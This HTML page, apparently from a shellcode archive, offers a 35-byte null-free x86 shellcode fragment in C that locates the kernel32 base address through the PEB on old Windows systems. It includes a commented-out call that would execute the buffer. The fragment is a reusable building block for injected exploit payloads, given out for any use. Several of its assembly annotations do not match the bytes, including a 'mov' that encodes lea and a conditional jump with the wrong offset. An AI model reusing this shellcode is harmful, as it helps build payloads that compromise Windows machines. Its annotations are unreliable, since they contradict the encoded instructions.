<html><head><title>Windows - PEB method (9x/NT/2k/XP)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*This is a 35 byte C implementation of the use of the PEB method to get
*the kernel32 base address on Windows. This is generic code designed to
*run on both Windows 9x and NT based systems. The code has been optimized
*to not have any 00h bytes so that you wont have to use an XOR routine to
*encode the shellcode. I used relative jumps and xor tricks to avoid the
*00h bytes and make the code as small as I could get it. Feel free to use
*this source in anything that you want.
*/


/* 35 byte PEB method for Windows 9x/NT/2k/XP
*  0x00 byte optimized, no XOR routine required.
*
*  www.4x10m.com
*  oc.192
*  irc.4x10m.net #4x10m
*/

unsigned char shellcode[] =
/*  35 byte PEB - 00h removal and size optimized  */
/*      22 - 24 total clock cycles on a x486      */
&quot;\x31\xC0&quot;                  /* xor eax, eax       */
&quot;\x31\xD2&quot;                  /* xor edx, edx       */
&quot;\xB2\x30&quot;                  /* mov dl, 30h        */
&quot;\x64\x8B\x02&quot;              /* mov eax, [fs:edx]  */      /* PEB base address */
&quot;\x85\xC0&quot;                  /* test eax, eax      */
&quot;\x78\xC0&quot;                  /* js 0Ch             */
&quot;\x8B\x40\x0C&quot;              /* mov eax, [eax+0Ch] */      /* NT kernel32 routine */
&quot;\x8B\x70\x1C&quot;              /* mov esi, [eax+1Ch] */
&quot;\xAD&quot;                      /* lodsd              */
&quot;\x8B\x40\x08&quot;              /* mov eax, [eax+08h] */
&quot;\xEB\x07&quot;                  /* jmp short 09h      */
&quot;\x8B\x40\x34&quot;              /* mov eax, [eax+34h] */      /* 9x kernel32 routine */
&quot;\x8D\x40\x7C&quot;              /* lea eax, [eax+7Ch] */
&quot;\x8D\x40\x3C&quot;              /* mov eax, [eax+3Ch] */
;

int main(int argc, char *argv[]) {
      //void (*sc)() = (void *)shellcode;
      printf(&quot;len:%d\n&quot;, sizeof(shellcode));
      //sc();
      return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
